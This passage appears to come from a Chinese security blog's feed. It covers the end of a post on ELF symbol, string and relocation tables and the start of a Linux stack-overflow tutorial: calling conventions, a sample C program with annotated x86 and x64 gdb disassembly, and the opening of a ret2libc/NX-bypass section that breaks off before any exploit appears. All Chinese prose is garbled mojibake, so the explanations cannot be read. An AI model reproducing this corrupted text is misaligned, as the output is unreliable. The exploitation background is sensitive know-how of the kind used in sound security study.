class="comment">//ç¬¦å·æ‰€åœ¨çš„èŠ‚</span></span><br><span class="line">    Elf32_Half st_shndx;    <span class="comment">//ç¬¦å·ç±»å‹åŠç»‘å®šå±æ€§</span></span><br><span class="line">&#125; Elf32_sym;</span><br></pre></td></tr></table></figure><h4 id="å­—ç¬¦ä¸²è¡¨"><a href="#å­—ç¬¦ä¸²è¡¨" class="headerlink" title="å­—ç¬¦ä¸²è¡¨"></a>å­—ç¬¦ä¸²è¡¨</h4><p>ç±»ä¼¼äºç¬¦å·è¡¨ï¼Œåœ¨å¤§å¤šæ•°å…±äº«åº“å’ŒåŠ¨æ€é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œä¹Ÿå­˜åœ¨ä¸¤ä¸ªå­—ç¬¦ä¸²è¡¨ã€‚å³<code>.dynstr</code>å’Œ<code>.strtab</code>ï¼Œåˆ†åˆ«å¯¹åº”äº<code>.dynsym</code>å’Œ<code>symtab</code>ã€‚æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ª<code>.shstrtab</code>çš„èŠ‚å¤´å­—ç¬¦ä¸²è¡¨ï¼Œç”¨äºä¿å­˜èŠ‚å¤´è¡¨ä¸­ç”¨åˆ°çš„å­—ç¬¦ä¸²ï¼Œå¯é€šè¿‡<code>sh_name</code>è¿›è¡Œç´¢å¼•ã€‚</p><p>ELFæ–‡ä»¶ä¸­æ‰€æœ‰å­—ç¬¦è¡¨çš„ç»“æ„åŸºæœ¬ä¸€è‡´ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºã€‚</p><h4 id="é‡å®šä½è¡¨"><a href="#é‡å®šä½è¡¨" class="headerlink" title="é‡å®šä½è¡¨"></a>é‡å®šä½è¡¨</h4><p><strong>é‡å®šä½å°±æ˜¯å°†ç¬¦å·å®šä¹‰å’Œç¬¦å·å¼•ç”¨è¿›è¡Œè¿æ¥çš„è¿‡ç¨‹</strong>ã€‚å¯é‡å®šä½æ–‡ä»¶éœ€è¦åŒ…å«æè¿°å¦‚ä½•ä¿®æ”¹èŠ‚å†…å®¹çš„ç›¸å…³ä¿¡æ¯ï¼Œä»è€Œä½¿å¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶èƒ½å¤Ÿä¿å­˜è¿›ç¨‹çš„ç¨‹åºé•œåƒæ‰€éœ€è¦çš„æ­£ç¡®ä¿¡æ¯ã€‚</p><p>é‡å®šä½è¡¨æ˜¯è¿›è¡Œé‡å®šä½çš„é‡è¦ä¾æ®ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨objdumpå·¥å…·æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„é‡å®šä½è¡¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;  <span class="comment">//é‡å®šä½å…¥å£çš„åç§»ã€‚</span></span><br><span class="line">                          <span class="comment">//å¯¹äºå¯é‡å®šä½æ–‡ä»¶æ¥è¯´ï¼Œè¿™ä¸ªå€¼æ˜¯è¯¥é‡å®šä½å…¥å£æ‰€è¦ä¿®æ­£çš„ä½ç½®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ç›¸å¯¹äºèŠ‚èµ·å§‹çš„åç§»</span></span><br><span class="line">                          <span class="comment">//å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº«å¯¹è±¡æ–‡ä»¶æ¥è¯´ï¼Œè¿™ä¸ªå€¼æ˜¯è¯¥é‡å®šä½å…¥å£æ‰€è¦ä¿®æ­£çš„ä½ç½®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„è™šæ‹Ÿåœ°å€</span></span><br><span class="line">    Elf32_word r_info;    <span class="comment">//é‡å®šä½å…¥å£çš„ç±»å‹å’Œç¬¦å·</span></span><br><span class="line">                          <span class="comment">//å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶æ¥è¯´ï¼Œå®ƒä»¬çš„é‡å®šä½å…¥å£æ˜¯åŠ¨æ€é“¾æ¥ç±»å‹çš„ã€‚</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info;</span><br><span class="line">    Elf32_Word r_addend;  <span class="comment">//æ­¤æˆå‘˜ç»™å‡ºä¸€ä¸ªå¸¸é‡è¡¥é½ï¼Œç”¨æ¥è®¡ç®—å°†è¢«å¡«å……åˆ°å¯é‡å®šä½å­—æ®µçš„æ•°å€¼ã€‚</span></span><br><span class="line">&#125; Elf32_Rela;</span><br></pre></td></tr></table></figure><blockquote><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.chuquan.me&#x2F;2018&#x2F;05&#x2F;21&#x2F;elf-introduce&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;papers&#x2F;Archive&#x2F;refs&#x2F;elf&#x2F;Understanding_ELF.pdf</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linuxæ ˆæº¢å‡ºæ€»ç»“ï¼ˆ0x02ï¼‰</title>
    <link href="https://www.ascotbe.com/2020/11/20/StackOverflow_Linux_0x02/"/>
    <id>https://www.ascotbe.com/2020/11/20/StackOverflow_Linux_0x02/</id>
    <published>2020-11-20T10:45:42.000Z</published>
    <updated>2021-05-17T02:10:09.877Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>åœ¨ä¸Šç¯‡ä¸­ä»‹ç»äº†ä¸€äº›å¸¸è§ä¿æŠ¤ï¼Œä»¥åŠå¦‚ä½•å¼€å…³ï¼Œè¿˜æœ‰å¦‚ä½•ç”Ÿæˆshellcodeç­‰æ“ä½œï¼Œå°±é‚£ä¹ˆç‚¹ä¸œè¥¿æˆ‘æäº†ä¸€æ˜ŸæœŸï¼ŒçœŸæ˜¯èœåäº†ï¼Œå¿ƒæ€å´©äº†äº†</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/11.png" alt="222" style="zoom:50%;" /><blockquote><h2 id="å†™åœ¨å‰é¢çš„å‡ ä¸ªç¬”è®°"><a href="#å†™åœ¨å‰é¢çš„å‡ ä¸ªç¬”è®°" class="headerlink" title="å†™åœ¨å‰é¢çš„å‡ ä¸ªç¬”è®°"></a>å†™åœ¨å‰é¢çš„å‡ ä¸ªç¬”è®°</h2></blockquote><blockquote><h4 id="CALLå’ŒRETæŒ‡ä»¤è§£é‡Š"><a href="#CALLå’ŒRETæŒ‡ä»¤è§£é‡Š" class="headerlink" title="CALLå’ŒRETæŒ‡ä»¤è§£é‡Š"></a>CALLå’ŒRETæŒ‡ä»¤è§£é‡Š</h4></blockquote><ul><li><strong>CALL</strong>æŒ‡ä»¤è°ƒç”¨æŸä¸ªå­å‡½æ•°æ—¶ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ä½œä¸ºè¿”å›åœ°å€è¢«ä¿å­˜åˆ°æ ˆä¸­ã€‚ç­‰ä»·äº<strong>PUSH</strong>è¿”å›åœ°å€ä¸<strong>JMP</strong>å‡½æ•°åœ°å€çš„æŒ‡ä»¤åºåˆ—</li><li><strong>RET</strong>æŒ‡ä»¤è·³è½¬åˆ°<strong>CALL</strong>æŒ‡ä»¤ä¿å­˜çš„è¿”å›åœ°å€ï¼Œè®²æ§åˆ¶æƒäº¤è¿˜ç»™è°ƒç”¨å‡½æ•°ã€‚ç­‰ä»·äº<strong>POP</strong>è¿”å›åœ°å€ä¸<strong>JMP</strong>è¿”å›åœ°å€çš„æŒ‡ä»¤åºåˆ—</li></ul><blockquote><h4 id="AMD64å’Œi386çš„åŒºåˆ«"><a href="#AMD64å’Œi386çš„åŒºåˆ«" class="headerlink" title="AMD64å’Œi386çš„åŒºåˆ«"></a>AMD64å’Œi386çš„åŒºåˆ«</h4></blockquote><p>ç”±äºåé¢çš„åˆ©ç”¨æ–¹å¼å¯èƒ½ä¼šç”¨åˆ°64ä½çš„ç¨‹åºï¼Œæ‰€ä»¥åœ¨å‰é¢æŠŠä¸¤è€…å‡ ä¸ªç‚¹éœ€è¦åŒºåˆ«ä¸‹</p><ul><li>é¦–å…ˆæ˜¯å†…å­˜åœ°å€çš„èŒƒå›´ç”±32ä½å˜æˆäº†64ä½ã€‚ä½†æ˜¯å¯ä»¥ä½¿ç”¨çš„å†…å­˜åœ°å€ä¸èƒ½å¤§äº<code>0x00007fffffffffff</code>ï¼Œå¦åˆ™å°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</li><li>å…¶æ¬¡æ˜¯å‡½æ•°å‚æ•°çš„ä¼ é€’æ–¹å¼å‘ç”Ÿäº†æ”¹å˜ï¼Œx86ä¸­å‚æ•°éƒ½æ˜¯ä¿å­˜åœ¨æ ˆä¸Šï¼Œä½†åœ¨x64ä¸­çš„å‰å…­ä¸ªå‚æ•°ä¾æ¬¡ä¿å­˜åœ¨<strong>RDI</strong>ã€<strong>RSI</strong>ã€<strong>RDX</strong>ã€<strong>RCX</strong>ã€ <strong>R8</strong>å’Œ<strong>R9</strong>ä¸­ï¼Œå¦‚æœè¿˜æœ‰æ›´å¤šçš„å‚æ•°çš„è¯æ‰ä¼šä¿å­˜åœ¨æ ˆä¸Šã€‚</li></ul><blockquote><h2 id="å‡½æ•°è°ƒç”¨æ ˆ"><a href="#å‡½æ•°è°ƒç”¨æ ˆ" class="headerlink" title="å‡½æ•°è°ƒç”¨æ ˆ"></a>å‡½æ•°è°ƒç”¨æ ˆ</h2></blockquote><p>å‡½æ•°è°ƒç”¨æ ˆæ˜¯ä¸€å—è¿ç»­çš„ç”¨æ¥ä¿å­˜å‡½æ•°è¿è¡ŒçŠ¶æ€çš„å†…å­˜åŒºåŸŸï¼Œè°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰å’Œè¢«è°ƒç”¨å‡½æ•° ï¼ˆcalleeï¼‰æ ¹æ®è°ƒç”¨å…³ç³»å †å èµ·æ¥ï¼Œä»å†…å­˜çš„é«˜åœ°å€å‘ä½åœ°å€å¢é•¿ã€‚</p><p>ä¸€ä¸ªå…¸å‹çš„æ ˆå¸§å¸ƒå±€å¦‚ä¸‹æ‰€ç¤º:</p><ol><li>å‡½æ•°å‚æ•°</li><li>å‡½æ•°è¿”å›åœ°å€</li><li>å¸§æŒ‡é’ˆ</li><li>é”™è¯¯å¤„ç†å¸§</li><li>å±€éƒ¨å˜é‡</li><li>æ ˆç¼“å†²åŒº</li><li>è¢«è°ƒå‡½æ•°ä¿å­˜çš„å¯„å­˜å™¨</li></ol><p>æ ˆå¸§çš„å¸ƒå±€å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/24.png" alt="img"></p><p>åœ¨windows/Intelå¹³å°ä¸Šï¼Œå½“å‘ç”Ÿä¸€ä¸ªå‡½æ•°è°ƒç”¨æ—¶ï¼Œæ•°æ®é€šè¿‡å¦‚ä¸‹çš„æ–¹å¼å­˜æ”¾åœ¨æ ˆä¸Šï¼š</p><ol><li>åœ¨å‡½æ•°è°ƒç”¨ä¹‹å‰å…ˆå°†å‡½æ•°å‚æ•°å‹æ ˆï¼Œå‚æ•°æŒ‰ç…§ä»<strong>å³</strong>åˆ°<strong>å·¦</strong>çš„é¡ºåºã€‚</li><li>ç”±x86çš„<strong>call</strong>æŒ‡ä»¤å°†å‡½æ•°çš„è¿”å›åœ°å€å‹æ ˆï¼ˆ<strong>é€šå¸¸ä¸ºcallå‘½ä»¤çš„ä¸‹ä¸€ä¸ªåœ°å€</strong>ï¼‰ï¼Œè¿™ä¸ªè¿”å›åœ°å€å°±æ˜¯å‡½æ•°è°ƒç”¨ç»“æŸå<strong>ret</strong>æŒ‡ä»¤æ”¾å…¥EIPå¯„å­˜å™¨çš„å€¼ã€‚</li><li>ä¸Šä¸€ä¸ªæ ˆå¸§çš„æ ˆå¸§æŒ‡é’ˆé€šè¿‡EBPçš„å€¼å‹æ ˆ</li><li>å¦‚æœå‡½æ•°åŒ…å«äº†try/catchæˆ–è€…å…¶ä»–çš„å¼‚å¸¸å¤„ç†ç»“æ„ï¼ˆå¦‚SEHï¼‰ï¼Œç¼–è¯‘å™¨ä¼šåœ¨æ ˆä¸Šæ”¾ç½®å¼‚å¸¸å¤„ç†æ‰€éœ€è¦çš„ä¿¡æ¯ã€‚</li><li>æ ˆä¸Šåˆ†é…å±€éƒ¨å˜é‡</li><li>ä¸ºä¸´æ—¶æ•°æ®åˆ†é…æ ˆç¼“å†²åŒº</li><li>æœ€åï¼Œè¢«è°ƒå‡½æ•°ä¿å­˜ESI, EDI, EBXå¯„å­˜å™¨çš„å€¼ã€‚ å¯¹äºlinux/intelå¹³å°ï¼Œè¿™ä¸€æ­¥åœ¨ç¬¬4æ­¥ä¹‹å</li></ol><blockquote><h4 id="æ ·ä¾‹"><a href="#æ ·ä¾‹" class="headerlink" title="æ ·ä¾‹"></a>æ ·ä¾‹</h4></blockquote><p>æ¼”ç¤ºä»£ç </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2, <span class="keyword">int</span> arg3, <span class="keyword">int</span> arg4, <span class="keyword">int</span> arg5, <span class="keyword">int</span> arg6, <span class="keyword">int</span> arg7, <span class="keyword">int</span> arg8)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">int</span> loc1 = arg1 + <span class="number">1</span>; <span class="keyword">int</span> loc8 = arg8 + <span class="number">8</span>; <span class="keyword">return</span> loc1 + loc8; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> func(<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">77</span>, <span class="number">88</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -m32 stack.c -o stack32</span></span><br><span class="line"><span class="comment">// gcc stack.c -o stack64</span></span><br></pre></td></tr></table></figure><blockquote><h4 id="æ ˆçš„åˆ†å¸ƒå›¾"><a href="#æ ˆçš„åˆ†å¸ƒå›¾" class="headerlink" title="æ ˆçš„åˆ†å¸ƒå›¾"></a>æ ˆçš„åˆ†å¸ƒå›¾</h4></blockquote><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/25.png" alt="image-20210314150418220"></p><blockquote><h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4></blockquote><p>é¦–å…ˆï¼Œè¢«è°ƒç”¨å‡½æ•° func()çš„ 8 ä¸ªå‚æ•°ä»åå‘å‰ä¾æ¬¡å…¥æ ˆï¼Œå½“æ‰§è¡Œ call æŒ‡ä»¤æ—¶ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€0x08048415 ä½œä¸ºè¿”å›åœ°å€å…¥æ ˆã€‚ç„¶åç¨‹åºè·³è½¬åˆ° func()ï¼Œåœ¨å‡½æ•°å¼€å¤´ï¼Œå°†è°ƒç”¨å‡½æ•°çš„ ebp å‹æ ˆä¿å­˜å¹¶æ›´æ–°ä¸ºå½“å‰çš„æ ˆé¡¶åœ°å€espä½œä¸ºæ–°çš„æ ˆåŸºå€ï¼Œè€Œ esp åˆ™ä¸‹ç§»ä¸ºå±€éƒ¨å˜é‡å¼€è¾Ÿç©ºé—´ã€‚å‡½æ•°è¿”å›æ—¶åˆ™ç›¸åï¼Œé€šè¿‡ leave æŒ‡ä»¤å°† esp æ¢å¤ä¸ºå½“å‰çš„ebpï¼Œå¹¶ä»æ ˆä¸­å°†è°ƒç”¨è€…çš„ ebp å¼¹å‡ºï¼Œæœ€å ret æŒ‡ä»¤å¼¹å‡ºè¿”å›åœ°å€ä½œä¸º eipï¼Œç¨‹åºå›åˆ° main()å‡½æ•°ä¸­ï¼Œæœ€åæŠ¬é«˜esp æ¸…ç†è¢«è°ƒç”¨è€…çš„å‚æ•°ï¼Œä¸€æ¬¡å‡½æ•°è°ƒç”¨çš„è¿‡ç¨‹å°±ç»“æŸäº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#X86ä¸­çš„æ ˆ</span><br><span class="line">gefâ¤ disassemble main 0x080483fd &lt;+0&gt;: push ebp                   # å°†æ ˆåº• ebp å‹æ ˆ (esp -&#x3D; 4) </span><br><span class="line">0x080483fe &lt;+1&gt;: mov ebp,esp                                      # æ›´æ–° ebp ä¸ºå½“å‰æ ˆé¡¶ esp </span><br><span class="line">0x08048400 &lt;+3&gt;: push 0x58                                        # å°† arg8 å‹æ ˆ (esp -&#x3D; 4) </span><br><span class="line">0x08048402 &lt;+5&gt;: push 0x4d                                        # å°† arg7 å‹æ ˆ (esp -&#x3D; 4) </span><br><span class="line">0x08048404 &lt;+7&gt;: push 0x42                                        # å°† arg6 å‹æ ˆ (esp -&#x3D; 4) </span><br><span class="line">0x08048406 &lt;+9&gt;: push 0x37                                        # å°† arg5 å‹æ ˆ (esp -&#x3D; 4) </span><br><span class="line">0x08048408 &lt;+11&gt;:push 0x2c                                        # å°† arg4 å‹æ ˆ (esp -&#x3D; 4) </span><br><span class="line">0x0804840a &lt;+13&gt;:push 0x21                                        # å°† arg3 å‹æ ˆ (esp -&#x3D; 4) </span><br><span class="line">0x0804840c &lt;+15&gt;:push 0x16                                        # å°† arg2 å‹æ ˆ (esp -&#x3D; 4) </span><br><span class="line">0x0804840e &lt;+17&gt;:push 0xb                                         # å°† arg1 å‹æ ˆ (esp -&#x3D; 4) </span><br><span class="line">0x08048410 &lt;+19&gt;:call 0x80483db &lt;func&gt;                            # è°ƒç”¨ func (push 0x08048415) </span><br><span class="line">0x08048415 &lt;+24&gt;:add esp,0x20                                     # æ¢å¤æ ˆé¡¶ esp </span><br><span class="line">0x08048418 &lt;+27&gt;:leave                                            # (mov esp, ebp; pop ebp) </span><br><span class="line">0x08048419 &lt;+28&gt;:ret                                              # å‡½æ•°è¿”å› (pop eip) </span><br><span class="line">gefâ¤ disassemble func 0x080483db &lt;+0&gt;: push ebp                   # å°†æ ˆåº• ebp å‹æ ˆ (esp -&#x3D; 4) </span><br><span class="line">0x080483dc &lt;+1&gt;: mov ebp,esp                                      # æ›´æ–° ebp ä¸ºå½“å‰æ ˆé¡¶ esp </span><br><span class="line">0x080483de &lt;+3&gt;: sub esp,0x10                                     # ä¸ºå±€éƒ¨å˜é‡å¼€è¾Ÿæ ˆç©ºé—´ </span><br><span class="line">0x080483e1 &lt;+6&gt;: mov eax,DWORD PTR [ebp+0x8]                      # å–å‡º arg1 </span><br><span class="line">0x080483e4 &lt;+9&gt;: add eax,0x1                                      # è®¡ç®— loc1 </span><br><span class="line">0x080483e7 &lt;+12&gt;:mov DWORD PTR [ebp-0x8],eax                      # loc1 æ”¾å…¥æ ˆ </span><br><span class="line">0x080483ea &lt;+15&gt;:mov eax,DWORD PTR [ebp+0x24]                     # å–å‡º arg8 </span><br><span class="line">0x080483ed &lt;+18&gt;:add eax,0x8                                      # è®¡ç®— loc8 </span><br><span class="line">0x080483f0 &lt;+21&gt;:mov DWORD PTR [ebp-0x4],eax                      # loc8 æ”¾å…¥æ ˆ </span><br><span class="line">0x080483f3 &lt;+24&gt;:mov edx,DWORD PTR [ebp-0x8] </span><br><span class="line">0x080483f6 &lt;+27&gt;:mov eax,DWORD PTR [ebp-0x4] </span><br><span class="line">0x080483f9 &lt;+30&gt;:add eax,edx                                      # è®¡ç®—è¿”å›å€¼ </span><br><span class="line">0x080483fb &lt;+32&gt;:leave                                            # (mov esp, ebp; pop ebp) </span><br><span class="line">0x080483fc &lt;+33&gt;:ret                                              # å‡½æ•°è¿”å› (pop eip)</span><br></pre></td></tr></table></figure><blockquote><p>x86-64</p></blockquote><p>å¯¹äº x86-64 çš„ç¨‹åºï¼Œå‰6 ä¸ªå‚æ•°åˆ†åˆ«é€šè¿‡rdiã€rsiã€rdxã€rcxã€r8å’Œr9è¿›è¡Œä¼ é€’ï¼Œå‰©ä½™å‚æ•°æ‰åƒx86ä¸€æ ·ä»åå‘å‰ä¾æ¬¡å‹æ ˆã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å‘ç°func()æ²¡æœ‰ä¸‹ç§»rspå¼€è¾Ÿæ ˆç©ºé—´çš„æ“ä½œï¼Œå¯¼è‡´rbpå’Œrspçš„å€¼æ˜¯ç›¸åŒçš„ï¼Œå…¶å®è¿™æ˜¯ä¸€é¡¹ç¼–è¯‘ä¼˜åŒ–ï¼šæ ¹æ®AMD64 ABIæ–‡æ¡£çš„æè¿°ï¼Œrspä»¥ä¸‹128å­—èŠ‚çš„åŒºåŸŸè¢«ç§°ä¸ºred zoneï¼Œè¿™æ˜¯ä¸€å—è¢«ä¿ç•™çš„å†…å­˜ï¼Œä¸ä¼šè¢«ä¿¡å·æˆ–è€…ä¸­æ–­æ‰€ä¿®æ”¹ã€‚äºæ˜¯ï¼Œfunc()ä½œä¸ºå¶å­å‡½æ•°å°±å¯ä»¥åœ¨ä¸è°ƒæ•´æ ˆæŒ‡é’ˆçš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨è¿™å—å†…å­˜ä¿å­˜ä¸´æ—¶æ•°æ®ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤ disassemble main </span><br><span class="line">0x000000000040050a &lt;+0&gt;: push rbp                    # å°†æ ˆåº• rbp å‹æ ˆ (rsp -&#x3D; 8) </span><br><span class="line">0x000000000040050b &lt;+1&gt;: mov rbp,rsp                 # æ›´æ–° rbp ä¸ºå½“å‰æ ˆé¡¶ rsp </span><br><span class="line">0x000000000040050e &lt;+4&gt;: push 0x58                   # å°† arg8 å‹æ ˆ (rsp -&#x3D; 8) </span><br><span class="line">0x0000000000400510 &lt;+6&gt;: push 0x4d                   # å°† arg7 å‹æ ˆ (rsp -&#x3D; 8) </span><br><span class="line">0x0000000000400512 &lt;+8&gt;: mov r9d,0x42                # å°† arg6 èµ‹å€¼ç»™ r9 </span><br><span class="line">0x0000000000400518 &lt;+14&gt;: mov r8d,0x37               # å°† arg5 èµ‹å€¼ç»™ r8 </span><br><span class="line">0x000000000040051e &lt;+20&gt;: mov ecx,0x2c               # å°† arg4 èµ‹å€¼ç»™ rcx </span><br><span class="line">0x0000000000400523 &lt;+25&gt;: mov edx,0x21               # å°† arg3 èµ‹å€¼ç»™ rdx </span><br><span class="line">0x0000000000400528 &lt;+30&gt;: mov esi,0x16               # å°† arg2 èµ‹å€¼ç»™ rsi </span><br><span class="line">0x000000000040052d &lt;+35&gt;: mov edi,0xb                # å°† arg1 èµ‹å€¼ç»™ rdi </span><br><span class="line">0x0000000000400532 &lt;+40&gt;: call 0x4004d6 &lt;func&gt;       # è°ƒç”¨ func (push 0x400537) </span><br><span class="line">0x0000000000400537 &lt;+45&gt;: add rsp,0x10               # æ¢å¤æ ˆé¡¶ rsp </span><br><span class="line">0x000000000040053b &lt;+49&gt;: leave                      # (mov rsp, rbp; pop rbp) </span><br><span class="line">0x000000000040053c &lt;+50&gt;: ret                        # å‡½æ•°è¿”å› (pop rip) </span><br><span class="line">gefâ¤ disassemble func </span><br><span class="line">0x00000000004004d6 &lt;+0&gt;: push rbp                    # å°†æ ˆåº• rbp å‹æ ˆ (rsp -&#x3D; 8) </span><br><span class="line">0x00000000004004d7 &lt;+1&gt;: mov rbp,rsp                 # æ›´æ–° rbp ä¸ºå½“å‰æ ˆé¡¶ rsp </span><br><span class="line">0x00000000004004da &lt;+4&gt;: mov DWORD PTR [rbp-0x14],edi </span><br><span class="line">0x00000000004004dd &lt;+7&gt;: mov DWORD PTR [rbp-0x18],esi </span><br><span class="line">0x00000000004004e0 &lt;+10&gt;: mov DWORD PTR [rbp-0x1c],edx </span><br><span class="line">0x00000000004004e3 &lt;+13&gt;: mov DWORD PTR [rbp-0x20],ecx </span><br><span class="line">0x00000000004004e6 &lt;+16&gt;: mov DWORD PTR [rbp-0x24],r8d </span><br><span class="line">0x00000000004004ea &lt;+20&gt;: mov DWORD PTR [rbp-0x28],r9d </span><br><span class="line">0x00000000004004ee &lt;+24&gt;: mov eax,DWORD PTR [rbp-0x14] </span><br><span class="line">0x00000000004004f1 &lt;+27&gt;: add eax,0x1 </span><br><span class="line">0x00000000004004f4 &lt;+30&gt;: mov DWORD PTR [rbp-0x8],eax </span><br><span class="line">0x00000000004004f7 &lt;+33&gt;: mov eax,DWORD PTR [rbp+0x18] </span><br><span class="line">0x00000000004004fa &lt;+36&gt;: add eax,0x8 </span><br><span class="line">0x00000000004004fd &lt;+39&gt;: mov DWORD PTR [rbp-0x4],eax </span><br><span class="line">0x0000000000400500 &lt;+42&gt;: mov edx,DWORD PTR [rbp-0x8] </span><br><span class="line">0x0000000000400503 &lt;+45&gt;: mov eax,DWORD PTR [rbp-0x4] </span><br><span class="line">0x0000000000400506 &lt;+48&gt;: add eax,edx                # è®¡ç®—è¿”å›å€¼ </span><br><span class="line">0x0000000000400508 &lt;+50&gt;: pop rbp                    # æ¢å¤ rbp (rsp +&#x3D; 8) </span><br><span class="line">0x0000000000400509 &lt;+51&gt;: ret                        # å‡½æ•°è¿”å› (pop rip)</span><br></pre></td></tr></table></figure><blockquote><h2 id="ç»•è¿‡NXä¿æŠ¤"><a href="#ç»•è¿‡NXä¿æŠ¤" class="headerlink" title="ç»•è¿‡NXä¿æŠ¤"></a>ç»•è¿‡NXä¿æŠ¤</h2></blockquote><h3 id="Ret2libc"><a href="#Ret2libc" class="headerlink" title="Ret2libc"></a>Ret2libc</h3><p>Bypass DEP é€šè¿‡ret2libcç»•è¿‡DEPé˜²æŠ¤ï¼Œç°åœ¨æˆ‘ä»¬æŠŠDEPæ‰“å¼€ï¼Œä¾ç„¶å…³é—­stack protectorå’ŒASLRã€‚è¿™æ—¶å€™æˆ‘ä»¬æŒ‰ä¸Šç¯‡æ— ä¿æŠ¤çš„æ€è·¯æ¥åšé¢˜çš„è¯ï¼Œç³»ç»Ÿä¼šæ‹’ç»æ‰§è¡Œæˆ‘ä»¬çš„shellcodeã€‚å¦‚æœä½ é€šè¿‡<code>sudo cat 